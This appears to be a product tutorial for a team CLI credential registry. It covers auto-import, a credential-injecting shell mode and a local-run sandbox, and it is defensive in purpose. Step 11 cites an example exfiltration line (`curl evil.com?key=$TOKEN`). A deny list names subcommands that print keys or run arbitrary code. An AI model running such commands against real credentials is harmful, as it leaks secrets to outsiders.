# tools-registry — auto-import & the shell plugin (hands-on tutorial)

A focused, standalone walkthrough of two features that make a whole team's command-line tools usable in
seconds: **auto-import** (turn the CLIs already on your machine into registered tools) and **shell mode**
(a shell where those CLIs run with the team credential injected automatically — no `treg run`, no keys on
your machine). It ends with the **local-run security sandbox** that makes running a shared credential on a
member's machine safe.

Every step shows the **exact command**, the **expected output**, and a **"Notice:"** line explaining what
happened and why it matters. Copy each command and follow along. The registry in the examples is
`https://treg.superdesign.dev`; replace it with your own.

> This is a companion to the main [hands-on tutorial](/tutorial) (sign-in, teams, the proxy, skills). Read
> that first if the words *tool*, *skill*, *org*, or *member* are new. For controlling **which** tools each
> person may use, see the [team access-control tutorial](/tutorial-access.md).

---

## Concepts (read once)

- **A "tool" can be an HTTP API or a command-line program.** `treg call` proxies an API; `treg run` runs a
  vendor **CLI** (stripe, gh, gcloud, …) with the org credential injected, so you use it without owning the
  key. Auto-import and shell mode are both about the CLI kind.
- **Two run tiers.** `--local` (default) runs the CLI on **your** machine; `--server` runs it on the
  registry, so the key never reaches you. A tool can support both.
- **Auto-import reads your machine.** `treg scan clis` looks at which catalog CLIs are actually installed
  (and whether you are logged into them); `treg upload clis` registers each on the right tier — the key you
  already have in your environment goes to the server-injected tier; a CLI you are logged into stays local.
  (`treg scan` = read-only preview, `treg upload` = register; `treg import` is the old name for `upload`.)
- **Shell mode shadows CLIs on `PATH`.** `treg shell start` puts a private folder first on your `PATH` with
  one small wrapper (a "shim") named after each **registered** CLI. When you type `gh`, the shell finds our
  wrapper first and routes it through treg; when you type `ls` or `git`, there is no wrapper, so it runs
  normally. The "is this a team CLI?" test is done for free by the shell's own name lookup.
- **The credential is never in your shell.** In shell mode the secret exists only inside the one subprocess
  treg spawns for a command, and only for that command. Your shell's environment never holds it.
- **The security sandbox is opt-in and layered.** On Linux and macOS, `sudo treg setup-local-run` makes a
  local run execute as a separate, locked-down user that (a) you cannot read, (b) can reach only the tool's
  own API on the network, and (c) cannot write the key to a file you could read.

---

# Part 1 — Auto-import: your installed CLIs become team tools

You have `gh`, `stripe`, `gcloud`, and a dozen other CLIs installed and logged in already. Auto-import turns
them into registered treg tools in one pass, choosing the safe run tier for each — no hand-writing a
`treg.json` per tool.

## Step 1 — Preview what would be registered (nothing is written)

`treg scan clis` scans your machine: for each CLI in treg's catalog it checks whether the
program is installed, whether its API key is in your environment, and whether you are logged into the CLI's
own config. It writes nothing — it only reports.

```bash
treg scan clis
```
```text
Scanned 21 catalog CLIs — 9 installed here.

Would register (server, key injected):
  openai
  stripe
Would register (local, uses your login):
  doctl
  flyctl
  gcloud
  gh
  supabase
  vercel
Not supported:
  az: az has no token-override env var (device/browser login only) — register an Azure service principal as an HTTP tool instead

12 more catalog CLIs aren't installed. List them with: treg scan clis --status
```

**Notice:** two groups. **Server tier** (`openai`, `stripe`) — their API key is in your environment, so
treg can hold it and inject it; these can run on the server, where the key never touches a member's
machine. **Local tier** (`gh`, `gcloud`, …) — you are logged into the CLI itself (its own config on disk),
so treg registers the tool without any secret and just runs the CLI you already authenticated. `az` uses a
browser/device login with no token to hand over, so it is reported as not supported, with the exact
alternative.

## Step 2 — Register them

Drop `--dry-run` to actually register. `--replace` deletes-and-recreates anything already registered, so
re-running is safe.

```bash
treg upload clis --replace
```
```text
Scanned 21 catalog CLIs — 9 installed here.

Registered (server, key injected):
  openai
  stripe
Registered (local, uses your login):
  doctl
  flyctl
  gcloud
  gh
  supabase
  vercel
Not supported:
  az: az has no token-override env var (device/browser login only) — register an Azure service principal as an HTTP tool instead

12 more catalog CLIs aren't installed. List them with: treg scan clis --status
```

**Notice:** the server-tier CLIs uploaded their key (encrypted) and are now bound tools; the local-tier
CLIs registered **secret-less** — internally their profile has `inject: []`, meaning "inject nothing, just
run the program the member is already logged into." The report is deliberately plain text (no emojis, no
colour) so it is easy to scan and paste.

## Step 3 — Confirm a local-tier CLI actually runs

A local-tier tool should run with no credential at all. This used to be broken — a local CLI would try to
inject a key it did not have and fail. It is fixed: a local tool now runs the program directly.

```bash
treg run gh -- --version
```
```text
▸ gh · audit #58
gh version 2.72.0 (2025-04-30)
https://github.com/cli/cli/releases/tag/v2.72.0
```

**Notice:** the `▸ gh · audit #58` line (on standard error) shows treg wrapped the run and recorded it; the
rest is `gh`'s own output. No key was needed — treg just ran the `gh` you already logged into.

## Step 4 — See what is not installed, and add an off-catalog CLI

`--status` lists the catalog CLIs you do **not** have, with the install command for each. `--add BIN`
registers an installed CLI that is not in the catalog at all.

```bash
treg scan clis --status
```
```text
…
In the catalog, not installed here:
  glab          brew install glab
  render        brew install render-oss/render/render
  neonctl       npm i -g neonctl
  …
```
```bash
treg upload clis --add mycli --env MYCLI_TOKEN --base-url https://api.mycli.com
```

**Notice:** `--add` asks for the environment variable the CLI reads its key from (blank if it logs in on
its own) and the API base URL, registers the tool, and prints a catalog-entry snippet you can share so the
CLI is added for everyone. An off-catalog CLI is not on the server's allow-list, so it runs **locally**
until an admin allow-lists its program name.

---

# Part 2 — Shell mode: the team's CLIs "just work"

`treg run stripe -- …` is explicit and safe, but typing `treg run` before every command is friction. Shell
mode removes it: you start a shell, then use `stripe`, `gh`, `gcloud` exactly as if you had installed and
logged into them yourself.

## Step 5 — Start the shell

```bash
treg shell start
```
```text
▚ treg shell — you're now in a shell where your team's CLIs just work.
  The tools below run with the team credential injected for you — no `treg run`,
  no keys on this machine, and every call is audited.

  Injected here (8):  doctl  flyctl  gcloud  gh  openai  stripe  supabase  vercel
  A CLI marked (server) runs on the registry, not your machine. Everything else
  (ls, git, your own tools) behaves exactly as usual.

  Leave any time with exit (or Ctrl-D) — your normal shell returns unchanged.

(treg) (base) ~/work $
```

**Notice:** you are now in a subshell. The prompt shows a `(treg)` marker. The banner lists the registered
CLIs that are now "shadowed" — a private folder with one wrapper per CLI was put first on your `PATH`. The
credential is **not** in this shell's environment; it is fetched per command.

## Step 6 — Use a team CLI with no `treg run`

At the `(treg)` prompt, run a registered CLI by its normal name.

```bash
gh --version
```
```text
▸ gh · audit #59
gh version 2.72.0 (2025-04-30)
https://github.com/cli/cli/releases/tag/v2.72.0
```

**Notice:** you typed `gh`, not `treg run gh`. The shell found treg's `gh` shim first (it is first on
`PATH`), which routed the command through treg — hence the `▸ gh · audit #59` audit line — and then ran the
real `gh`. Everything after the program name is passed to the CLI verbatim, and its exit code is yours.

## Step 7 — Non-team commands are untouched

```bash
git --version
```
```text
git version 2.39.5 (Apple Git-154)
```

**Notice:** no `▸ … audit` line. `git` is not a registered tool, so there is no shim for it; the shell
resolves the real `git` normally. Shell mode only touches the CLIs your team registered — it never gets in
the way of anything else. (Tab-completion is also untouched: pressing Tab after `gh` runs gh's internal
completion directly, so it does **not** create an audit row per keystroke.)

## Step 8 — Leave, and confirm everything reverts

```bash
exit
```
```text
▚ treg shell closed.
$ which gh
/opt/homebrew/bin/gh
```

**Notice:** `exit` (or Ctrl-D, or closing the terminal) tears the session down: the private shim folder is
removed and your `PATH` returns to normal, so `which gh` points at the real binary again. Nothing is left
behind.

## Step 9 — Route one CLI to the server, and set a time limit

Two options on `start`. `--server-for <tools>` makes those CLIs run **on the registry** (the key never
touches your machine); `--ttl <minutes>` closes the shell automatically.

```bash
treg shell start --server-for stripe --ttl 60
```
```text
▚ treg shell — you're now in a shell where your team's CLIs just work.
  …
  Injected here (8):  doctl  flyctl  gcloud  gh  openai  stripe (server)  supabase  vercel
  …
  This shell closes automatically in 60 min.
```
Inside the shell:
```bash
stripe --version      # runs on the server; output streamed back
exit
treg runs --limit 1
```
```json
[
  { "tool": "stripe", "argv": ["--version"], "exit_code": 0, "duration_ms": 92, "where": "server" }
]
```

**Notice:** `stripe` is marked `(server)` in the banner and its run is recorded with `"where": "server"` in
the run log — it executed on the registry, not your laptop, so the key never reached you. Local runs appear
in the same log tagged `"where": "local"`.

> **Why no background "agent"?** An earlier design kept credentials in memory for the whole session. We
> dropped it on purpose: fetching the credential fresh **per command** and running it under an isolated
> user (next part) leaves nothing in memory between commands — a stronger position than a long-lived agent
> holding keys.

---

# Part 3 — The local-run security sandbox

A local run puts a shared team key on a member's machine for the length of one command. That is only safe
if the member cannot capture the key. `sudo treg setup-local-run` (Linux and macOS) builds a sandbox with
three layers. Set it up once, as an administrator on the machine.

```bash
sudo treg setup-local-run
```
```text
created hidden system user 'treg-run' (uid 380)
installed runner at /usr/local/bin/treg-runner
installed sudoers rule for member 'you'
  egress: pf allow-list active — treg-run may reach 95 host(s), all else dropped

done — you can now run:  treg run <tool> -- <args>   (the CLI runs as treg-run)
```

**Notice:** it creates a dedicated, no-login user `treg-run`, a narrow rule that lets you run **only** the
treg runner as that user, and a network allow-list (below). From now on a local run executes as `treg-run`,
not as you.

## Step 10 — Layer 1: isolation (you cannot read the key)

The CLI runs as `treg-run`, a different user id. A different user's process environment and memory are
unreadable by you. To see this directly, register a tiny tool whose program is `id` and run it.

```bash
treg run idtool
```
```text
▸ idtool · audit #52
uid=380(treg-run) gid=380(treg-run) groups=380(treg-run)…
```

**Notice:** the command ran as **`uid=380(treg-run)`**, not as you. The team credential only ever exists
inside that user's process, which your account cannot read (`ps` shows nothing, there is no `/proc` entry
you can open). One requirement: treg itself must be installed at a system path (for example
`/usr/local/bin`), because `treg-run`, by design, cannot read into your private home directory to run it.

## Step 11 — Layer 2: egress allow-list (the key cannot leave over the network)

Even isolated, a CLI feature that runs your code could try to send the key to another site. The sandbox
restricts `treg-run`'s outbound network to only the registry plus the tool API hosts in the catalog.

```bash
# run AS treg-run for the demo:
sudo -u treg-run curl -s -o /dev/null -w "%{http_code}\n" https://api.github.com/zen   # a catalog host
sudo -u treg-run curl -s -o /dev/null -w "%{http_code}\n" https://example.com          # anything else
```
```text
200
000
```

**Notice:** `treg-run` reached `api.github.com` (200) but was **blocked** from `example.com` (000, the
connection was dropped), while your own shell is unaffected. So `curl evil.com?key=$TOKEN` from a rogue CLI
plugin cannot deliver the key anywhere. Because API IP addresses drift, re-resolve the allow-list
periodically with `sudo treg setup-local-run --refresh-egress`.

## Step 12 — Layer 3: filesystem jail (the key cannot be written to a readable file)

The last escape route is writing the key to a file you then read. The optional `--fs-jail` confines a run's
writes to a private scratch folder that only `treg-run` can read, removed after the run.

```bash
treg run --fs-jail writetool -- /tmp/leak     # writetool's program is `touch`
ls /tmp/leak
```
```text
touch: /tmp/leak: Operation not permitted
ls: /tmp/leak: No such file or directory
```
Without the jail, the same write succeeds:
```bash
treg run writetool -- /tmp/leak2
ls -l /tmp/leak2
```
```text
-rw-r--r--  1 treg-run  wheel  0  /tmp/leak2
```

**Notice:** under `--fs-jail`, writing to `/tmp/leak` was denied ("Operation not permitted") and no file
was created — a CLI cannot drop the key where you could pick it up. `--fs-jail` is opt-in because it also
stops a CLI writing legitimate output files, so you turn it on for tools where that trade is worth it.

## Two more built-in protections

- **Output redaction.** When you run a tool whose key you do **not** own (a shared key), treg scrubs the
  key's value out of the CLI's own output before it reaches your screen — so a command that prints the key
  shows `***` instead.
- **Catalog deny rules.** Catalog CLIs refuse the specific sub-commands that would print the key or run
  arbitrary code with it — for example `gh extension`, `gh auth token`, `doppler run`. These are enforced
  on the server, where the key lives, so a tampered client cannot skip them.

Each tool's owner opts local runs in first — `treg tool update <name> --local-run on` (off by default,
because a run hands a credential to a machine).

---

## How this was tested

Every claim above was verified live, not asserted:

- **Auto-import**: `treg scan clis` and `--replace` registered the real set (openai/stripe on
  the server tier; gh/gcloud/etc. local), and `treg run gh -- --version` printed gh's version with no
  credential — confirming the local-tier fix.
- **Shell mode**: inside `treg shell start`, `gh --version` produced an audit line (intercepted) while
  `git --version` produced none (untouched); `exit` restored `which gh` to the real binary; a
  `--server-for stripe` run appeared in `treg runs` as `"where": "server"`; tab-completion created no audit
  rows.
- **Isolation**: `treg run idtool` printed `uid=380(treg-run)`, and the member could not read that
  process's environment.
- **Egress**: `treg-run` reached `api.github.com` (200) and was blocked from `example.com` (000), with the
  member's own network unaffected.
- **Filesystem jail**: `treg run --fs-jail … -- /tmp/leak` returned "Operation not permitted" and created
  no file; the same run without the jail created the file.

---

## See also

- **[Main hands-on tutorial](/tutorial)** — sign-in, teams, the proxy, secrets, skills, roles.
- **[Team access control](/tutorial-access.md)** — decide which tools each member may use, and turn local
  execution on or off per person.
